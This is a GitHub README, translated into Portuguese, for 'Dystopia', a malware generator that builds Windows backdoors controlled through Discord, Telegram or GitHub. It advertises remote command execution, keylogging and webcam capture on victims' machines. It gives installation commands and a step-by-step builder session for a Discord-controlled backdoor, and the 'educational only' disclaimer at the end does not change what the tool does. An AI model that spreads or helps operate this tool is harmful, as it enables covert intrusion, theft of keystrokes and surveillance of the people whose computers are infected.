<h1 align="center">
  <br>
  <a href="https://github.com/3ct0s/"><img src="https://i.ibb.co/qY09wWK/download-2.png" width=600 weigth=500 alt="Dystopia"></a>
  <br>
  Dystopia
  <br>
</h1>

<h4 align="center">Dystopia Command and Control</h4>

<p align="center">
    <img src="https://img.shields.io/badge/Backdoor_Platform-Windows-blue">
    <img src="https://img.shields.io/badge/Version-2.1.2-blue">
    <img src="https://img.shields.io/badge/Python-3.8.9-blue">
</p>

---

## O que é distopia?
Dystopia é um gerador de malware que gera backdoors que usam plataformas online como C2s. Isso inclui Discord, Telegram e Github.

Nosso objetivo é provar que qualquer coisa pode ser um C2, se você quiser :) ...

## Como funciona?

Os backdoors do Dystopia estão usando bibliotecas que permitem que o backdoor atue como um "Bot" para as plataformas mencionadas acima. Essencialmente, o invasor contata o bot e especifica um comando malicioso para executar no "Agente" alvo.

Dystopia é equipado com muitos recursos, alguns dos quais são:

Tráfego criptografado (HTTPS)
Executando comandos do sistema no agente de destino
Keylogger (limitado ao Discord)
Capturando fotos da webcam
Vários agentes online ao mesmo tempo (limitado ao Discord e GitHub)

## Instalaão e uso
 # tenha o git intalado na maquina pode usar o comando 
sudo apt install git

O Dystopia é melhor instalado e usado no Kali Linux:
```
git clone https://github.com/MViniDias/dystopia-c2
cd ./Dystopia-c2
chmod +x setup.sh
./setup.sh
```
ma vez feito isso, podemos usar o builder. Vamos construir um backdoor C2 baseado em discord:
```
python builder.py
use discord
set name <backdoor-name>
set guild-id <server id from discord>
set bot-token <discord bot token>
set channel-id <channel id from discord server>
set webhook <discord webhook>
build
```

## Como configurar o Dystopia
Como o processo de configuração é muito específico para cada plataforma:
> Siga o [setup guide](https://github.com/3ct0s/dystopia-c2/wiki/) para configurar o Dystopia

## Contribuidores
Contribuições são bem-vindas ao nosso repositório GitHub! Valorizamos o envolvimento da comunidade e apreciamos todos os tipos de contribuições, de relatórios de bugs a códigos. Junte-se a nós para construir algo ótimo e causar um impacto positivo no mundo. Envolva-se hoje mesmo!

## Isenção de responsabilidade
Este repositório github é feito apenas para fins educacionais. O desenvolvedor não é responsável por qualquer uso indevido deste software. Não use este software para fins ilegais.
